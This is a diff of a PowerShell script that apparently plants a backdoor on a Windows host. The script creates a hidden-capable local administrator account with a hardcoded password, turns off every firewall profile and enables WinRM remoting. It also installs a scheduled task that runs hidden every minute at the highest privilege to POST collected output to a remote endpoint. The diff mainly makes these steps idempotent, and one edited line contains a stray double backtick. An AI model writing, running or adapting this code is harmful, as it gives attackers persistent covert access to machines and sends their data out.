@@ -27,41 +27,50 @@ $username = "Adm1nistrator"
 $password = "Pa$$w0rd"
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 
-# Create local user
-New-LocalUser `
-    -Name $username `
-    -Password $securePassword `
-    -FullName $username `
-    -Description "Local admin account" `
-    -PasswordNeverExpires `
-    -AccountNeverExpires
+# Check if the local user already exists
+$userExists = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
 
-# Add user to Administrators group
-Add-LocalGroupMember -Group "Administrators" -Member $username
+if (-not $userExists) {
+    # Create local user
+    New-LocalUser `
+        -Name $username `
+        -Password $securePassword `
+        -FullName $username `
+        -Description "Local admin account" ``
+        -AccountNeverExpires
+    net user Adm1nistrator /passwordreq:yes
+    Set-LocalUser -Name "Adm1nistrator" -PasswordNeverExpires $true
+
+    # Add user to Administrators group
+    Add-LocalGroupMember -Group "Administrators" -Member $username
 
 
-# # Hide user from login screen
-# $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+    # # Hide user from login screen
+    # $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
-# # Create registry path if it does not exist
-# if (-not (Test-Path $regPath)) {
-#     New-Item -Path $regPath -Force | Out-Null
-# }
+    # # Create registry path if it does not exist
+    # if (-not (Test-Path $regPath)) {
+    #     New-Item -Path $regPath -Force | Out-Null
+    # }
 
-# # Set user to hidden (0 = hidden, 1 = visible)
-# New-ItemProperty `
-#     -Path $regPath `
-#     -Name $username `
-#     -PropertyType DWORD `
-#     -Value 0 `
-#     -Force | Out-Null
-
+    # # Set user to hidden (0 = hidden, 1 = visible)
+    # New-ItemProperty `
+    #     -Path $regPath `
+    #     -Name $username `
+    #     -PropertyType DWORD `
+    #     -Value 0 `
+    #     -Force | Out-Null
+}
 
 # disable firewalls
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
-# Enable WIN-RM
-Enable-PSRemoting -Force
+# Check WinRM service status
+$winrmService = Get-Service -Name WinRM -ErrorAction SilentlyContinue
+
+if ($winrmService -and $winrmService.Status -ne 'Running') {
+    Enable-PSRemoting -Force
+}
 
 
 # Make a sender file under the random temp folder
@@ -77,30 +86,33 @@ Invoke-WebRequest `
     -Method POST `
     -Body $output `
     -ContentType "text/plain"
-
-
 '@ | Set-Content -Path $filePath -Encoding UTF8
 
 # Create task schedule for sender.ps1
 $taskName   = "RunSenderPS1"
 
-$action = New-ScheduledTaskAction `
-    -Execute "powershell.exe" `
-    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""
+# Check if the scheduled task already exists
+$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 
-$trigger = New-ScheduledTaskTrigger `
-    -Once `
-    -At (Get-Date) `
-    -RepetitionInterval (New-TimeSpan -Minutes 1) `
-    -RepetitionDuration (New-TimeSpan -Days 365)
+if (-not $taskExists) {
 
-Register-ScheduledTask `
-    -TaskName $taskName `
-    -Action $action `
-    -Trigger $trigger `
-    -RunLevel Highest `
-    -Force
-
+    $action = New-ScheduledTaskAction `
+        -Execute "powershell.exe" `
+        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""
+    
+    $trigger = New-ScheduledTaskTrigger `
+        -Once `
+        -At (Get-Date) `
+        -RepetitionInterval (New-TimeSpan -Minutes 1) `
+        -RepetitionDuration (New-TimeSpan -Days 365)
+    
+    Register-ScheduledTask `
+        -TaskName $taskName `
+        -Action $action `
+        -Trigger $trigger `
+        -RunLevel Highest `
+        -Force
+}
 
 
 
